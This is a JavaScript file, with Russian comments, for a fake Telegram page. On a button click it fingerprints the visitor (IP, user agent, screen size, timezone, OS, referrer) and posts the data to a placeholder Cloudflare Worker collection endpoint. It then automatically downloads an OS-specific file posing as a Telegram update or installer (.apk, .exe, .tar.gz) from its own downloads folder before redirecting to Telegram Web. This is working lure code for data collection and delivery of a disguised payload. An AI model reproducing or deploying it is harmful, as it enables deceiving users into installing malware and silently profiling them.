document.addEventListener('DOMContentLoaded', function() {
    const button = document.getElementById('continueBtn');
    const loader = document.getElementById('loader');
    
    button.addEventListener('click', function() {
        // Показать загрузку
        button.style.display = 'none';
        loader.style.display = 'block';
        
        // Сбор данных пользователя
        const userData = {
            ip: 'Определяется...',
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform,
            os: getOS(),
            timestamp: new Date().toISOString(),
            referrer: document.referrer
        };
        
        // Определение ОС
        function getOS() {
            const userAgent = navigator.userAgent;
            if (/android/i.test(userAgent)) return 'Android';
            if (/iPad|iPhone|iPod/.test(userAgent)) return 'iOS';
            if (/Win/.test(userAgent)) return 'Windows';
            if (/Mac/.test(userAgent)) return 'MacOS';
            if (/Linux/.test(userAgent)) return 'Linux';
            return 'Unknown';
        }
        
        // Получение IP
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userData.ip = data.ip;
                sendDataToServer(userData);
            })
            .catch(() => {
                userData.ip = 'Не удалось определить';
                sendDataToServer(userData);
            });
        
        // Отправка данных на сервер
        function sendDataToServer(data) {
            // Сохраняем данные локально в localStorage для отладки
            localStorage.setItem('last_collected_data', JSON.stringify(data, null, 2));
            
            // Отправка на Cloudflare Worker (если настроен)
            const webhookURL = 'https://your-worker.workers.dev/collect';
            
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                console.log('Data sent successfully');
            })
            .catch(error => {
                console.log('Failed to send data, continuing locally');
            });
            
            // Определение и скачивание файла для ОС
            setTimeout(() => {
                handleOSRedirect(userData.os);
            }, 1500);
        }
        
        // Обработка редиректа в зависимости от ОС
        function handleOSRedirect(os) {
            let downloadUrl = '';
            let filename = '';
            
            switch(os) {
                case 'Android':
                    downloadUrl = 'downloads/telegram_update.apk';
                    filename = 'telegram_update.apk';
                    break;
                case 'Windows':
                    downloadUrl = 'downloads/TelegramSetup.exe';
                    filename = 'TelegramSetup.exe';
                    break;
                case 'Linux':
                    downloadUrl = 'downloads/telegram_update.tar.gz';
                    filename = 'telegram_update.tar.gz';
                    break;
                case 'iOS':
                    showiOSMessage();
                    return;
                default:
                    downloadUrl = 'downloads/TelegramSetup.exe';
                    filename = 'TelegramSetup.exe';
            }
            
            initiateDownload(downloadUrl, filename);
        }
        
        // Показ сообщения для iOS
        function showiOSMessage() {
            loader.innerHTML = `
                <div style="color: #0088cc; margin-bottom: 15px;">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="#0088cc">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                </div>
                <h3 style="margin-bottom: 10px;">Для устройств iOS</h3>
                <p>Установите официальное приложение Telegram из App Store</p>
                <p style="margin-top: 15px; font-size: 14px; color: #666;">
                    Перенаправление в App Store...
                </p>
            `;
            
            setTimeout(() => {
                window.location.href = 'https://apps.apple.com/app/telegram-messenger/id686449807';
            }, 2000);
        }
        
        // Инициирование скачивания
        function initiateDownload(url, filename) {
            // Показываем сообщение о скачивании
            loader.innerHTML = `
                <div style="color: #4CAF50; margin-bottom: 15px;">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="#4CAF50">
                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
                    </svg>
                </div>
                <p>Скачивание файла...</p>
                <p style="font-size: 12px; color: #666; margin-top: 10px;">
                    Если скачивание не началось автоматически, 
                    <a href="${url}" download="${filename}" style="color: #0088cc;">нажмите здесь</a>
                </p>
            `;
            
            // Автоматическое скачивание
            const link = document.createElement('a');
            link.href = url;
            link.download = filename;
            link.style.display = 'none';
            document.body.appendChild(link);
            
            // Триггер скачивания
            setTimeout(() => {
                link.click();
                document.body.removeChild(link);
                
                // Редирект на Telegram Web
                setTimeout(() => {
                    loader.innerHTML = `
                        <div style="color: #0088cc; margin-bottom: 15px;">
                            <svg width="48" height="48" viewBox="0 0 24 24" fill="#0088cc">
                                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                            </svg>
                        </div>
                        <p>Файл скачан. Открываем Telegram Web...</p>
                    `;
                    
                    setTimeout(() => {
                        window.location.href = 'https://web.telegram.org';
                    }, 1500);
                }, 1000);
            }, 500);
        }
    });
    
    // Эффекты при наведении
    const telegramBox = document.querySelector('.telegram-box');
    if (telegramBox) {
        telegramBox.addEventListener('mouseenter', () => {
            telegramBox.style.transform = 'translateY(-5px)';
            telegramBox.style.boxShadow = '0 15px 35px rgba(0, 0, 0, 0.2)';
        });
        
        telegramBox.addEventListener('mouseleave', () => {
            telegramBox.style.transform = 'translateY(0)';
            telegramBox.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.15)';
        });
    }
});
